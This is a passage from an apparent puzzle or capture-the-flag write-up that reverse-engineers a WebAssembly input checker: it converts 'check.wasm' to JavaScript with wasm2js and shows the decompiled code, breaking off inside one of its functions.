        <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">check.wasm</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">response</span><span class="p">.</span><span class="nf">arrayBuffer</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">wasm</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nf">instantiate</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
        <span class="kd">const</span> <span class="p">{</span><span class="nx">memory</span><span class="p">,</span> <span class="nx">check</span><span class="p">}</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">;</span>
        <span class="nx">wasmMemory</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">;</span>
        <span class="nx">wasmCheck</span> <span class="o">=</span> <span class="nx">check</span><span class="p">;</span>
    <span class="p">})();</span>
<span class="p">})</span>
</pre></table></code></div></div><p>and see that it’s calling a WASM code file to parse the input number. So we can start by ignoring all of the JS and just focusing on the WASM bits:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">wasm2js check.wasm
</span></pre></table></code></div></div><p>wasm2js from binaryen can be installed from at least the fedora repositories, and produces nicer, easier to read javascript:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">Table</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// grow method not included; table is not growable</span>
  <span class="nx">ret</span><span class="p">.</span><span class="kd">set</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">func</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">func</span><span class="p">;</span>
  <span class="p">};</span>
  <span class="nx">ret</span><span class="p">.</span><span class="kd">get</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
  <span class="p">};</span>
  <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
<span class="p">}</span>

  <span class="kd">var</span> <span class="nx">bufferView</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">base64ReverseLookup</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="mi">123</span><span class="cm">/*'z'+1*/</span><span class="p">);</span>
  <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="mi">48</span><span class="o">+</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">52</span><span class="o">+</span><span class="nx">i</span><span class="p">;</span> <span class="c1">// '0-9'</span>
    <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="mi">65</span><span class="o">+</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span> <span class="c1">// 'A-Z'</span>
    <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="mi">97</span><span class="o">+</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">26</span><span class="o">+</span><span class="nx">i</span><span class="p">;</span> <span class="c1">// 'a-z'</span>
  <span class="p">}</span>
  <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span> <span class="o">=</span> <span class="mi">62</span><span class="p">;</span> <span class="c1">// '+'</span>
  <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="mi">47</span><span class="p">]</span> <span class="o">=</span> <span class="mi">63</span><span class="p">;</span> <span class="c1">// '/'</span>
  <span class="cm">/** @noinline Inlining this function would mean expanding the base64 string 4x times in the source code, which Closure seems to be happy to do. */</span>
  <span class="kd">function</span> <span class="nf">base64DecodeToExistingUint8Array</span><span class="p">(</span><span class="nx">uint8Array</span><span class="p">,</span> <span class="nx">offset</span><span class="p">,</span> <span class="nx">b64</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">b1</span><span class="p">,</span> <span class="nx">b2</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">offset</span><span class="p">,</span> <span class="nx">bLength</span> <span class="o">=</span> <span class="nx">b64</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="nx">end</span> <span class="o">=</span> <span class="nx">offset</span> <span class="o">+</span> <span class="p">(</span><span class="nx">bLength</span><span class="o">*</span><span class="mi">3</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">b64</span><span class="p">[</span><span class="nx">bLength</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nx">b64</span><span class="p">[</span><span class="nx">bLength</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for </span><span class="p">(;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">bLength</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">b1</span> <span class="o">=</span> <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="nx">b64</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)];</span>
      <span class="nx">b2</span> <span class="o">=</span> <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="nx">b64</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">2</span><span class="p">)];</span>
      <span class="nx">uint8Array</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="nx">b64</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="nx">b1</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">end</span><span class="p">)</span> <span class="nx">uint8Array</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="nx">b2</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">end</span><span class="p">)</span> <span class="nx">uint8Array</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b2</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="nx">base64ReverseLookup</span><span class="p">[</span><span class="nx">b64</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)];</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="kd">function</span> <span class="nf">initActiveSegments</span><span class="p">(</span><span class="nx">imports</span><span class="p">)</span> <span class="p">{</span>
  <span class="nf">base64DecodeToExistingUint8Array</span><span class="p">(</span><span class="nx">bufferView</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="dl">"</span><span class="s2">WAAAAFQAAAAGAAAABQAAAAAAAAAKAAAATQAAAEEAAAADAAAAUwAAAAAAAAAAAAAABwAAAAoAAABbAAAADgAAAAEAAABIAAAAawAAAAQAAAAHAAAAZgAAAHAAAABjAAAAfgAAAEwAAAAAAAAAAAAAAFgAAABUAAAABgAAAAUAAAAAAAAACgAAAE0AAABBAAAAAwAAAFMAAAAAAAAAAAAAAAcAAAAKAAAAWwAAAA4AAAABAAAASAAAAGsAAAAEAAAABwAAAGYAAABwAAAAYwAAAH4AAABMAAAAAAAAAAAAAABZAAAAbwAAAHUAAAAgAAAAZAAAAGkAAABkAAAAIAAAAG4AAABvAAAAdAAAACAAAABvAAAAcAAAAGUAAABuAAAAIAAAAHQAAABoAAAAZQAAACAAAABsAAAAbwAAAGMAAABrAAAAIQAAAA==</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">asmFunc</span><span class="p">(</span><span class="nx">env</span><span class="p">)</span> <span class="p">{</span>
 <span class="kd">var</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">16777216</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAP8</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Int8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAP16</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Int16Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAP32</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Int32Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAPU8</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAPU16</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint16Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAPU32</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAPF32</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float32Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">HEAPF64</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
 <span class="kd">var</span> <span class="nx">Math_imul</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">imul</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_fround</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">fround</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_abs</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_clz32</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">clz32</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_min</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_max</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_floor</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_ceil</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">ceil</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_trunc</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">trunc</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">Math_sqrt</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">abort</span> <span class="o">=</span> <span class="nx">env</span><span class="p">.</span><span class="nx">abort</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">nan</span> <span class="o">=</span> <span class="kc">NaN</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">infinity</span> <span class="o">=</span> <span class="kc">Infinity</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">=</span> <span class="mi">5244240</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nb">global</span><span class="nx">$1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nb">global</span><span class="nx">$2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="kd">function</span> <span class="nf">$1</span><span class="p">(</span><span class="nx">$0</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">$3_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">$3_1</span> <span class="o">=</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">-</span> <span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">$0</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">label$1</span> <span class="p">:</span> <span class="p">{</span>
   <span class="nx">label$2</span> <span class="p">:</span> <span class="k">while </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">26</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">break</span> <span class="nx">label$1</span>
    <span class="p">}</span>
    <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">HEAP32</span><span class="p">[(</span><span class="mi">1136</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="mi">1024</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">continue</span> <span class="nx">label$2</span><span class="p">;</span>
   <span class="p">};</span>
  <span class="p">}</span>
  <span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">label$3</span> <span class="p">:</span> <span class="p">{</span>
   <span class="nx">label$4</span> <span class="p">:</span> <span class="k">while </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">26</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">break</span> <span class="nx">label$3</span>
    <span class="p">}</span>
    <span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">HEAP32</span><span class="p">[(</span><span class="mi">1136</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[</span><span class="nx">$3_1</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">continue</span> <span class="nx">label$4</span><span class="p">;</span>
   <span class="p">};</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$2</span><span class="p">(</span><span class="nx">$0</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">$3_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">$3_1</span> <span class="o">=</span> <span class="nb">global</span><span class="nx">$0</span> <span class="o">-</span> <span class="mi">16</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">$0</span><span class="p">;</span>
  <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nx">label$1</span> <span class="p">:</span> <span class="p">{</span>
   <span class="nx">label$2</span> <span class="p">:</span> <span class="k">while </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">26</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">break</span> <span class="nx">label$1</span>
    <span class="p">}</span>
    <span class="nx">HEAP32</span><span class="p">[((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">HEAP32</span><span class="p">[(</span><span class="mi">1248</span> <span class="o">+</span> <span class="p">((</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">HEAP32</span><span class="p">[(</span><span class="nx">$3_1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">]</span> <span class="o">|</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">continue</span> <span class="nx">label$2</span><span class="p">;</span>
   <span class="p">};</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="kd">function</span> <span class="nf">$3</span><span class="p">(</span><span class="nx">$0</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$0</span> <span class="o">=</span> <span class="nx">$0</span> <span class="o">|</span> <span class="mi">0</span><span class="p">;</span>
